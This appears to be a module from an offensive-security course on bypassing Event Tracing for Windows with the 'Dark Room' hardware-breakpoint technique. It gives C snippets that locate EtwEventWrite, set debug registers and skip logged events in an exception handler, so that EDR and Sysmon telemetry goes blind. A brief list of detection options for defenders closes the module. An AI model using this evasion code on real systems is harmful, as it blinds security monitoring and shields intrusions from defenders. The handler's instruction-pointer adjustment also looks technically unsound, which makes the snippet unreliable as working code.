Module 12 — ETW Bypass

First Principle: If you control the logger, you control what gets seen.

Overview

Event Tracing for Windows (ETW) is Microsoft's high-performance logging mechanism. It powers Windows Event Log, Sysmon, and most EDR telemetry. If you can silence ETW, you blind the defender.

The Dark Room technique uses hardware breakpoints (DR0/DR1) to intercept EtwEventWrite in ntdll.dll — zero memory writes, no hooks, no patches. Invisible to software scanners.

Theory

ETW providers register with the kernel. When an event fires, the kernel calls EtwEventWrite in ntdll.dll. This function marshals the event data and passes it to the kernel.

If we set a hardware breakpoint on EtwEventWrite, the CPU triggers a debug exception before the function executes. Our handler can redirect execution, skip the event, or modify the data.

The Attack

Step 1: Find EtwEventWrite

// Get the address from ntdll.dll
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");

Step 2: Set Hardware Breakpoint

// Set DR0 to the target address
CONTEXT ctx = {0};
ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
ctx.Dr0 = (DWORD64)pEtwEventWrite;
ctx.Dr7 = 0x101; // Local + global enable, exact match

NtSetContextThread(hThread, &ctx);

Step 3: Handle the Exception

// In your VEH handler:
if (ExceptionInfo->ExceptionRecord->ExceptionAddress == pEtwEventWrite) {
    // Skip the event — just return success
    ExceptionInfo->ContextRecord->Rip += 2; // Skip call instruction
    return EXCEPTION_CONTINUE_EXECUTION;
}
CRITICAL: This technique requires no special privileges beyond the ability to debug your own process. On Windows, any process can set debug registers on its own threads. The breakpoint is hardware — it exists in the CPU, not in memory.

Detection

Blue teams have limited options:

  • Hypervisor-based tracing: Intel PT or AMD IBS can record execution without relying on ETW. Expensive, complex.
  • Kernel callbacks: Register for debug register access notifications. Rarely implemented.
  • ETW session analysis: Look for gaps in event flow. Hard to distinguish from normal noise.
  • Memory forensics: Check CONTEXT structures for Dr7 != 0. Volatile — gone on thread exit.
